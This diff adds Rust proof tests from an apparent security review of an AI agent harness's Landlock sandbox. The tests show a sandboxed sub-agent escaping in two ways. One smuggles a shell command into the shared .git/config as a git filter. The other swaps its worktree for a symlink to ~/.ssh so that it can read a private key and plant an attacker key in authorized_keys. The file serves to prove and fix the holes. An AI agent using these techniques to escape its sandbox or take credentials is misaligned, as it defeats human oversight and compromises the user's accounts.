+//! GATE 3 REVIEW PROOFS (docs/security-review/2026-11-gate3.md), through the
+//! real `rizzy-harness sandbox-exec` wrapper and the real tools.
+//!
+//! Each test passes today, and passing is the defect: it asserts that the
+//! attack worked. Invert the assertions when the finding is fixed. On a
+//! kernel without Landlock the tests skip with a printed reason.
+
+use std::path::{Path, PathBuf};
+use std::sync::Arc;
+
+use harness_tools::sandbox::{Confinement, Sandbox, Settings};
+use harness_tools::{Bash, Read, Tool, ToolCtx, Write};
+use serde_json::json;
+
+const EXE: &str = env!("CARGO_BIN_EXE_rizzy-harness");
+
+/// A data directory, a fake home with an ssh key, and a project folder that
+/// is a git repository with one sub-agent worktree, made the way
+/// `Session::isolate` makes it (`<repo>/.git/harness-worktrees/<id>`).
+struct Fixture {
+    _dir: tempfile::TempDir,
+    data: PathBuf,
+    home: PathBuf,
+    repo: PathBuf,
+    worktree: PathBuf,
+}
+
+fn fixture() -> Fixture {
+    let dir = tempfile::tempdir().unwrap();
+    let root = dir.path().canonicalize().unwrap();
+    let data = root.join("data");
+    let home = root.join("home");
+    let repo = home.join("proj");
+    std::fs::create_dir_all(&data).unwrap();
+    std::fs::create_dir_all(home.join(".ssh")).unwrap();
+    std::fs::create_dir_all(&repo).unwrap();
+    std::fs::write(home.join(".ssh/id_ed25519"), "SSH-KEY-CANARY\n").unwrap();
+    let git = |args: &[&str]| {
+        let o = std::process::Command::new("git")
+            .args(["-c", "user.name=t", "-c", "user.email=t@t"])
+            .args(args)
+            .current_dir(&repo)
+            .env("GIT_CONFIG_GLOBAL", "/dev/null")
+            .output()
+            .unwrap();
+        assert!(o.status.success(), "{}", String::from_utf8_lossy(&o.stderr));
+    };
+    git(&["init", "-q"]);
+    std::fs::write(repo.join("a.txt"), "a\n").unwrap();
+    git(&["add", "a.txt"]);
+    git(&["commit", "-qm", "base"]);
+    let worktree = repo.join(".git/harness-worktrees/child1");
+    git(&[
+        "worktree",
+        "add",
+        "--detach",
+        "-q",
+        worktree.to_str().unwrap(),
+    ]);
+    Fixture {
+        _dir: dir,
+        data,
+        home,
+        repo,
+        worktree,
+    }
+}
+
+impl Fixture {
+    fn sandbox(&self) -> Arc<Sandbox> {
+        Arc::new(
+            Sandbox::new(
+                PathBuf::from(EXE),
+                &Settings::default(),
+                Some(self.data.join("sandbox-tmp")),
+                std::slice::from_ref(&self.data),
+            )
+            .unwrap(),
+        )
+    }
+
+    fn ctx(&self, cwd: &Path) -> ToolCtx {
+        let mut ctx = ToolCtx::new(cwd);
+        ctx.protected = Arc::new(vec![self.data.clone()]);
+        ctx.sandbox = Confinement::Confined {
+            sandbox: self.sandbox(),
+            tmp: None,
+        }
+        .for_session("s1");
+        ctx
+    }
+
+    async fn bash(&self, cwd: &Path, cmd: &str) -> String {
+        Bash.run(&self.ctx(cwd), json!({ "command": cmd }))
+            .await
+            .output
+    }
+
+    /// Whether Landlock works here (else the test skips).
+    fn landlock(&self) -> bool {
+        match self
+            .sandbox()
+            .probe(&self.data.join("sandbox-tmp/probe"), &self.data)
+        {
+            Ok(_) => true,
+            Err(e) => {
+                eprintln!("SKIPPED: Landlock does not work here: {e}");
+                false
+            }
+        }
+    }
+}
+
+/// S-1, the sandbox half. Inside the real Landlock sandbox, a sub-agent's
+/// shell defines a filter command in the main repository's `.git/config`:
+/// the grant on `<repo>/.git` allows it. The node's own git then runs that
+/// command outside the sandbox (`review_s1_…` in
+/// `crates/node/tests/runtime.rs`).
+#[tokio::test]
+async fn review_s1_a_sandboxed_sub_agent_writes_the_shared_git_config() {
+    let f = fixture();
+    if !f.landlock() {
+        return;
+    }
+    let out = f
+        .bash(
+            &f.worktree,
+            &format!(
+                "export HOME={home} GIT_CONFIG_GLOBAL=/dev/null; \
+                 git config filter.x.clean 'sh -c \"id > /tmp/x; cat\"'; echo rc=$?; \
+                 echo '* filter=x' > .gitattributes",
+                home = f.home.display()
+            ),
+        )
+        .await;
+    assert!(out.contains("rc=0"), "{out}");
+    let config = std::fs::read_to_string(f.repo.join(".git/config")).unwrap();
+    assert!(config.contains("[filter \"x\"]"), "{config}");
+    assert!(f.worktree.join(".gitattributes").exists());
+}
+
+/// S-2. A session's folder is trusted by name and resolved again on every
+/// call (`ToolCtx::resolve`, `Confinement::command`). A sub-agent's worktree
+/// lives in `<repo>/.git/harness-worktrees/<id>`, and its shell has
+/// read-write on all of `<repo>/.git`, so it can rename its own folder away
+/// and put a symlink there. From then on the file tools (which run in the
+/// node process, outside Landlock) and the next shell command work in the
+/// link's target: here the user's `~/.ssh`, which the sandbox denied a
+/// moment earlier.
+#[tokio::test]
+async fn review_s2_a_sub_agent_points_its_folder_at_another_one() {
+    let f = fixture();
+    if !f.landlock() {
+        return;
+    }
+    let wt = &f.worktree;
+    let victim = f.home.join(".ssh");
+    // Control: the sandbox denies the key.
+    let out = f
+        .bash(
+            wt,
+            &format!("cat {}/id_ed25519; echo rc=$?", victim.display()),
+        )
+        .await;
+    assert!(
+        !out.contains("SSH-KEY-CANARY") && !out.contains("rc=0"),
+        "{out}"
+    );
+    // One shell command, inside the sandbox.
+    let out = f
+        .bash(
+            wt,
+            &format!(
+                "cd / && mv {w} {w}.r && ln -s {v} {w}; echo rc=$?",
+                w = wt.display(),
+                v = victim.display()
+            ),
+        )
+        .await;
+    assert!(out.contains("rc=0"), "{out}");
+    // `read` needs no approval in `ask` mode.
+    let ctx = f.ctx(wt);
+    let r = Read.run(&ctx, json!({ "path": "id_ed25519" })).await;
+    assert!(r.ok && r.output.contains("SSH-KEY-CANARY"), "{}", r.output);
+    let w = Write
+        .run(
+            &ctx,
+            json!({ "path": "authorized_keys", "content": "attacker-key\n" }),
+        )
+        .await;
+    assert!(w.ok, "{}", w.output);
+    assert_eq!(
+        std::fs::read_to_string(victim.join("authorized_keys")).unwrap(),
+        "attacker-key\n"
+    );
+    // The next shell command is granted read-write on the link's target.
+    let out = f.bash(wt, "cat id_ed25519; echo x > planted").await;
+    assert!(out.contains("SSH-KEY-CANARY"), "{out}");
+    assert!(victim.join("planted").exists(), "{out}");
+}
